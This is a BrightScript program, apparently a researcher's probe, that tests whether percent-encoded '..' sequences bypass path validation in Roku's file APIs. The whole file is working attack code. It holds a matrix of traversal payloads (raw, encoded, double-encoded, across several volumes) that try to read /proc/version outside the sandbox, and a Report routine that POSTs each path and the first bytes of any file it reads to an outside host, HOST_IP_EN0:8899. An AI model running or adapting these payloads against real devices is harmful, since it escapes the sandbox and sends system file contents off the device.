' ENC — hunt the path-validation bypass in the BrightScript file APIs.
'
' Prior art says the Roku file layer mishandles URL/percent encoding: validation
' sees the literal string, the loader decodes it afterwards, so an encoded ".."
' slips past the PHY check that blocks plain absolute paths.
'
' Matrix of encodings x volumes, plus file:// via roUrlTransfer for completeness.
' Reports label, resulting length, and the first bytes of anything that resolves.

sub main()
    print "[ENC] ===== start ====="

    tests = [
        ["url3",       "file:///proc/version"],
        ["urlhost",    "file://localhost/proc/version"],
        ["raw_common", "common:/../../proc/version"],
        ["raw_tmp",    "tmp:/../../proc/version"],
        ["enc_lower",  "common:/%2e%2e/%2e%2e/proc/version"],
        ["enc_upper",  "common:/%2E%2E/%2E%2E/proc/version"],
        ["enc_sep",    "common:/..%2f..%2fproc/version"],
        ["enc_full",   "common:/%2E%2E%2F%2E%2E%2Fproc%2Fversion"],
        ["enc_double", "common:/%252e%252e/proc/version"],
        ["enc_pkg",    "pkg:/%2e%2e/%2e%2e/%2e%2e/proc/version"],
        ["enc_tmp",    "tmp:/%2e%2e/%2e%2e/proc/version"],
        ["enc_cache",  "cachefs:/%2e%2e/%2e%2e/proc/version"],
        ["enc_url",    "file:/%2e%2e/%2e%2e/proc/version"]
    ]

    for each item in tests
        label = item[0]
        path = item[1]
        got = TryRead(path)
        size = -1
        head = ""
        if got <> invalid then
            size = got.Len()
            if size > 0 then head = Left(got, 120)
        end if
        print "[ENC] "; label; " len="; size
        Report(label, path, size, head)
    end for

    print "[ENC] ===== end ====="
    Idle()
end sub

function TryRead(p as string) as dynamic
    try
        return ReadAsciiFile(p)
    catch e
        return invalid
    end try
end function

sub Report(label as string, path as string, size as dynamic, head as string)
    msg = label + "\t" + path + "\tlen=" + ToStr(size) + "\t" + head
    try
        x = CreateObject("roUrlTransfer")
        x.SetUrl("http://HOST_IP_EN0:8899/report")
        x.SetPort(CreateObject("roMessagePort"))
        x.PostFromString(msg)
    catch e
        print "[ENC] post threw"
    end try
end sub

function ToStr(v as dynamic) as string
    if type(v) = "Integer" or type(v) = "LongInteger" then
        s = v.ToStr()
        return s
    end if
    return "?"
end function

sub Idle()
    port = CreateObject("roMessagePort")
    while true
        wait(2000, port)
    end while
end sub
